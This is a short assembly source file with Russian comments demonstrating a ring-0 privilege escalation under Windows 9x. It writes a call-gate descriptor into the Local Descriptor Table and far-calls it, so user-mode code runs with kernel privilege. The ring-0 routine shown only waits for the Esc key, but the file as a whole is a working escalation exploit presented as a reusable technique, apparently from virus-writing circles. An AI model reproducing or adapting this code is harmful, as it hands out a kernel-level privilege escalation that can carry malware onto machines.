; Переход в нулевое кольцо под Win9x 
; Метод: LDT (Local Descriptor Table, таблица локальных дескрипторов)

.586p
.model flat

callW           macro   x
                extern  x:PROC
                call    x
                endm

.data

_Start:
                pusha
                call      set_seh                   ; install our SEH
                mov       ESP, [ESP + 8]
                jmp       short Exit_Main
set_seh:
                push      4 ptr FS:[0]
                mov       FS:[0], ESP
                call      get_r0                    ; get callgate addr
                call      ring0_proc
                retf                                ; back to r3
get_r0:
                pop       ESI                       ; ESI = callgate addr
                push      EBX                       ; get GDT addr
                sgdt      [ESP - 2]
                pop       EBX
                sldt      AX                        ; get LDT selector
                and       EAX, not 111b
                jz        short Exit_Main
                add       EBX, EAX                  ; LDT descriptor addr in GDT
                mov       EDI, [EBX + 2 - 2]        ; get LDT addr
                mov       AH, [EBX + 7]
                mov       AL, [EBX + 4]
                shrd      EDI, EAX, 16
                fild      8 ptr [EDI]               ; save descriptor
                mov       EAX, ESI                  ; make new callgate descriptor
                cld
                stosw
                mov       EAX, 1110110000000000b shl 16 + 28h
                stosd
                shld      EAX, ESI, 16
                stosw
                db        9Ah                       ; call callgate
                dd        0
                dw        100b + 11b                ; sel.#0, LDT, r3
                fistp     8 ptr [EDI - 8]           ; restore descriptor
Exit_Main:
                pop       4 ptr FS:[0]              ; rem SEH
                pop       EAX
                popa
                retn

; код в нулевом кольце!
ring0_proc:                                ; r0 start
                push    ss ss
                pop     ds es

                pushad

; Ждем нажатия Esc
WaitESC:                                   
                in        AL, 60h
                cmp       AL, 1
                jne       WaitESC

                popad
                retn                       ; r0 end
.code

start:
                call        _Start
exit:
                push        00000000h
                callW       ExitProcess
end start